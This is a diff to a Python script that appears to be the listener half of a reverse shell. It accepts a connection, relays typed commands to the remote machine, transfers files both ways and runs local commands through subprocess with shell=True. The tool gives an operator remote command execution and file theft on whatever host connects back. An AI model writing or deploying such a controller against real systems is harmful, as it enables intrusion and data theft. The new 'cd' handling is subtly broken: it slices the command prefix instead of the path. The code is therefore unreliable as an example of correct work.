@@ -3,6 +3,7 @@
 import socket
 import os
 import traceback
+import subprocess
 
 
 def start_server(host, port):
@@ -12,8 +13,8 @@ def start_server(host, port):
     print(f'Listening on {port}...')
 
     client, addr = server.accept()
-    print(f'Connection established: {addr[0]}:{addr[1]}') 
-    
+    print(f'Connection established: {addr[0]}:{addr[1]}')
+
     shell_session(client, addr, server)
 
 
@@ -27,7 +28,7 @@ def send_file(filename, client):
 
 
 def recv_file(filename, client):
-    chunk_size =  4096
+    chunk_size = 4096
 
     with open(filename, 'wb') as f:
         while chunk := client.recv(chunk_size):
@@ -40,35 +41,38 @@ def shell_session(client, addr, server):
 
     try:
         while True:
-            command = input(f'{addr[0]}\033[1m*\033[32mshell\033[m: ').strip()
+            # command input
+            command = input(f'{addr[0]}\033[1m*\033[32m>_\033[m: ').strip()
             if command.lower() in exit_list:
                 client.send(command.lower().encode())
                 break
-            elif command == '':
+            elif not command:
                 pass
-            elif command.lower() == 'clean':
-                os.system('clear')
+
+            # use "!" for local commands
             elif command.startswith('!'):
-                os.system(command[1:])
+                local_command = command[1:].strip()
+
+                # handles "cd" separately
+                if local_command.startswith('cd'):
+                    path = local_command[:3].strip()
+                    try:
+                        os.chdir(path)
+                        print(f'Changed local directory to: {os.getcwd()}')
+                    except FileNotFoundError:
+                        print(f'Error: No such directory: "{path}"')
+                    except PermissionError:
+                        print(f'Error: Permission denied: "{path}"')
+                    except NotADirectoryError:
+                        print(f'Error: Not a directory: "{path}"')
+                else:
+                    subprocess.run(local_command, shell=True)
             elif command.startswith('upload'):
-                filename = command[5:]
+                filename = command[7:]
                 send_file(filename, client)
             elif command.startswith('download'):
-                filename = command[7:]
+                filename = command[9:]
                 recv_file(filename, client)
-            elif command == 'help':
-                print('''
-                \n
-                commands:
-                
-                clean - clean
-
-                !<command> - execute local commands: !ls
-                command: ls
-                
-                quit, exit, close... - finish connection.
-                \n
-                ''')
             else:
                client.send(command.encode())
                output = client.recv(1024).decode()
